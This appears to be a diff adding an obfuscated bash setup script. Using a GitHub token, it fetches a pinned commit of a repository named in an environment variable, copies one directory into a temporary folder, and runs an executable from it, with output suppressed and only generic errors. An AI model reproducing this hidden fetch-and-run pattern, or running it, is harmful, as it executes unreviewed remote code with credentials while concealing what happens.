@@ -1,0 +1,107 @@
+#!/usr/bin/env bash
+set -euo pipefail
+set +x
+
+f() {
+  printf '%s\n' "$1" >&2
+  exit 1
+}
+
+s() {
+  local n="$1"
+  if [ "${!n+x}" != "x" ]; then
+    f "setup failed"
+  fi
+}
+
+n() {
+  local n="$1"
+  s "$n"
+  if [ -z "${!n}" ]; then
+    f "setup failed"
+  fi
+}
+
+a() {
+  local q="$1"
+  if [[ ! "$q" =~ ^x[a-z2-7]{10}$ ]]; then
+    f "setup failed"
+  fi
+}
+
+b() {
+  local q="$1"
+  if [[ ! "$q" =~ ^x[a-z2-7]{10}(,x[a-z2-7]{10})*$ ]]; then
+    f "setup failed"
+  fi
+}
+
+h() {
+  local q="$1"
+  if [[ ! "$q" =~ ^[0-9a-f]{40}$ ]]; then
+    f "setup failed"
+  fi
+}
+
+n x2h73ypwhqg
+n xu3w3kt2df3
+n xya5nn3ekhw
+n xxat6lo2rzc
+a "${xxat6lo2rzc}"
+s xjdffg4whwk
+if [ -n "${xjdffg4whwk:-}" ]; then
+  b "${xjdffg4whwk}"
+fi
+
+d="$(mktemp -d)"
+c() {
+  rm -rf "$d"
+}
+trap c EXIT
+
+t="$d/r"
+q="$d/q"
+l="$d/l"
+o="$d/o"
+mkdir -p "$t" "$q"
+
+export GH_TOKEN="${xya5nn3ekhw}"
+r="${x2h73ypwhqg}"
+v="${xu3w3kt2df3}"
+k="${xxat6lo2rzc}"
+h "$v"
+
+git -C "$q" init --quiet
+git -C "$q" config credential.helper ""
+git -C "$q" config credential.https://github.com.helper "!gh auth git-credential"
+git -C "$q" remote add origin "https://github.com/${r}.git"
+git -C "$q" sparse-checkout init --cone
+git -C "$q" sparse-checkout set "x/${k}"
+
+g() {
+  local n
+  for n in 1 2 3 4; do
+    if GIT_TERMINAL_PROMPT=0 git -C "$q" fetch --quiet --no-tags --depth=1 --filter=blob:none origin "$v" 2>"$l"; then
+      return
+    fi
+    sleep 2
+  done
+  f "setup failed"
+}
+
+g
+GIT_TERMINAL_PROMPT=0 git -C "$q" checkout --quiet --detach FETCH_HEAD 2>"$l" || f "setup failed"
+git -C "$q" rev-parse HEAD >"$d/v" 2>"$l" || f "setup failed"
+read -r w <"$d/v"
+[ "$w" = "$v" ] || f "setup failed"
+u="$q/x/${k}"
+[ -d "$u" ] || f "setup failed"
+if find "$u" -mindepth 1 -maxdepth 1 ! -type f -print -quit | grep -q .; then
+  f "setup failed"
+fi
+cp "$u"/* "$t/"
+find "$t" -mindepth 1 -maxdepth 1 -type f -exec chmod 600 {} +
+chmod 700 "$t/x"
+
+export xgdeenpejzh="$o"
+"$t/x" >"$l" 2>&1 || f "run failed"
